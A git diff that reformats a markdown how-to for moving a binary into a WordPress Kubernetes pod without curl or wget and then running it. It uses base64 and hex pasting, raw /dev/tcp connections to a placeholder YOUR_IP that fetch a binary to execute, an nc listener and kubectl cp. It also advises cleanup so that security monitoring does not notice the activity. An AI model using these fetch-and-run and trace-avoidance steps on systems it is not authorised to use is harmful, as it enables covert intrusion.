@@ -5,25 +5,27 @@ Steps:
 
 On your local machine, encode the binary (e.g., your_binary) into Base64:
 
-bash
-Copy code
+```
 base64 your_binary > binary.b64
+```
 This converts the binary file into a long string of Base64 text.
 
 On the WordPress pod, create a new file where you can paste the Base64 string:
 
-bash
-Copy code
+```
 cat > binary.b64
+```
+
 After running the command, paste the Base64 content into the pod and press Ctrl+D to save the file.
 
 Decode the Base64 file back into the original binary:
 
-bash
-Copy code
+```
 base64 -d binary.b64 > your_binary
 chmod +x your_binary   # Make it executable
 ./your_binary          # Run the binary
+```
+
 Why it works: Even without network utilities (curl, wget, etc.), most shells have cat and base64 utilities. This approach works as long as the shell supports Base64 decoding.
 
 2. echo or printf File Transfer (Hex Dumping)
@@ -33,25 +35,28 @@ Steps:
 
 On your local machine, convert the binary file into hexadecimal using xxd:
 
-bash
-Copy code
+```
 xxd -p your_binary > binary.hex
+```
+
 This creates a text file containing the hexadecimal representation of the binary.
 
 On the WordPress pod, create a file to paste the hex dump into:
 
-bash
-Copy code
+```
 cat > binary.hex
+```
+
 Paste the hex content and save it with Ctrl+D.
 
 Convert the hex back into a binary file:
 
-bash
-Copy code
+```
 xxd -r -p binary.hex your_binary
 chmod +x your_binary    # Make it executable
 ./your_binary           # Run the binary
+```
+
 Why it works: Like Base64, xxd is often available in shells. This method is especially useful for small files since it doesn't require additional tools.
 
 3. Script a Reverse Shell to Transfer Files
@@ -61,23 +66,25 @@ Steps:
 
 On your local machine, set up a simple HTTP server to host the file:
 
-bash
-Copy code
+```
 python3 -m http.server 8000
+```
+
 This command will serve files in the current directory over HTTP on port 8000.
 
 On the WordPress pod, use bash to connect to your local server:
 
-bash
-Copy code
+```
 exec 5<>/dev/tcp/YOUR_IP/8000
 cat <&5 > your_binary   # Save the incoming data into your_binary
+```
+
 After the file transfer completes, make the binary executable:
 
-bash
-Copy code
+```
 chmod +x your_binary
 ./your_binary
+```
 Why it works: If /dev/tcp is enabled in the shell, you can establish raw TCP connections without needing curl or nc. This approach relies on creating an outbound connection to your server.
 
 4. Use the WordPress Filesystem
@@ -97,15 +104,16 @@ Steps:
 
 On a machine that has Kubernetes admin privileges, use kubectl cp to copy a file from your local system into the WordPress pod:
 
-bash
-Copy code
+```
 kubectl cp ./your_binary default/wordpress-pod:/path/to/destination
+```
 Then, on the pod:
 
-bash
-Copy code
+```
 chmod +x /path/to/destination/your_binary
 /path/to/destination/your_binary
+```
+
 Why it works: If you have access to Kubernetes admin tools like kubectl, you can directly interact with the pod’s filesystem.
 
 6. Using /dev/tcp for Transfers
@@ -115,24 +123,30 @@ Steps:
 
 On your local machine, start a listener that serves the binary file:
 
-bash
-Copy code
+```
 nc -lvp 8000 < your_binary
+```
 On the WordPress pod, use bash to connect to the listener and receive the file:
 
-bash
-Copy code
+```
 exec 3<>/dev/tcp/YOUR_IP/8000
 cat <&3 > your_binary
+```
+
 Once the file is downloaded, make it executable:
 
-bash
-Copy code
+```
 chmod +x your_binary
 ./your_binary
-Why it works: /dev/tcp is a lesser-known but powerful feature in bash that can be used to establish direct TCP connections without needing extra tools like nc.
+```
 
-Key Considerations:
+Why it works: 
+/dev/tcp is a lesser-known but powerful feature in bash that can be used to establish direct TCP connections without needing extra tools like nc.
+
+
+# Key Considerations:
 File Size: These methods work well for smaller files (typically under a few MB). For larger files, you'll need to split them into chunks or find another solution.
+
 Security Monitoring: Some methods (e.g., modifying WordPress files or using reverse shells) can be more easily detected by security systems or leave traces. Be mindful of any cleanup you need to do afterward.
+
 Pod Privileges: Your ability to use these methods depends on the configuration of the shell environment. For example, /dev/tcp might not be available on every shell.
